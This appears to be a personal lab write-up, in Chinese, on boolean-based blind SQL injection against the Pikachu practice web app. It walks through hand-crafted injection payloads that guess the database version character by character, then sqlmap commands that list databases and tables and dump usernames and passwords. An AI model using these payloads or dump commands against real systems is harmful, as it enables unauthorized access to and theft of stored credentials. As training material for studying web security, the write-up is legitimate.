# Pikachu 基于boolian的盲注




### 布林的盲注比較有良心，至少你還判斷的出來語句是否成功和失敗。

```
-----------------------------------------

成功
your uid:7
your email is: lili@pikachu.com



失敗
您输入的username不存在，请重新输入！


-----------------------------------------


猜測SQL語句
select * from member where username ="xxxxx";


先輸入之前的帳戶
lili 

your uid:7
your email is: lili@pikachu.com



lili' 

您输入的username不存在，请重新输入！


lili' and '1

your uid:7
your email is: lili@pikachu.com




lili' and '0
您输入的username不存在，请重新输入！


lili' #

your uid:7
your email is: lili@pikachu.com


------------------------------------------------------------------



猜出version長度

lili' and length(version())>1 #
lili' and length(version())>2 #
lili' and length(version())>3 #
直到猜出長度
lili' and length(version())=6 #




猜出 version 第一個字 5
lili' and substr(version(),1,1)=1 #
lili' and substr(version(),1,1)=2 #
lili' and substr(version(),1,1)=5 #


猜出 version 第二個字 .
lili' and substr(version(),2,1)='.' #

直到猜出 5.7.26


而且如果是非數字，就要加上單引號，很麻煩。
所以乾脆都轉成ascii


lili' and hex(substr(version(),1,1)) > 0 #
lili' and hex(substr(version(),1,1)) > 35 #
lili' and hex(substr(version(),1,1)) = 35 #


```




### 盲注很浪費時間所以要用工具 sqlmap。


```
python D:\SQL_map\sqlmap-master\sqlmap.py  -r http_request.txt --batch
```

### 創一個 http_request.txt
```
GET /vul/sqli/sqli_blind_b.php?name=11111&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1
Host: pika
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://pika/vul/sqli/sqli_blind_b.php
Cookie: PHPSESSID=0th98kt9k46723glmlma5bgt5e
Upgrade-Insecure-Requests: 1
```


### SQLmap 使用
```
sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch



获取数据库版本信息：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch --dbs





获取指定数据库的所有表名：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu --tables





获取指定数据库表的所有列名：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu -T users --columns



获取指定数据库表中的所有数据：

 sqlmap.py -r "C:\Users\liar\Desktop\http.txt"  --batch -D pikachu -T users --dump


指定特定數據
sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch --sql-query "SELECT username from users"

sqlmap.py -r "C:\Users\liar\Desktop\http.txt" --batch --sql-query "SELECT password from users"

```